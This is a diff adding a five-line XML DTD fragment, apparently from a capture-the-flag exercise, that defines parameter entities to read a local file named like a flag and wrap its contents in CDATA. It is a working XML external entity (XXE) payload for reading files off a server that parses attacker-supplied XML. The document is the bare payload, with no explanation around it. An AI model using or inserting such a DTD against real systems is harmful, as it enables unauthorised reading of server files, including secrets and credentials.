@@ -1,0 +1,5 @@
+<!ENTITY % targetFile SYSTEM "file:///flag_c56834fa586bd69dd62140979a729f94">
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % end "]]>">
+<!ENTITY % everything "<!ENTITY wrappedFile '%start;%targetFile;
+    %end;'>">
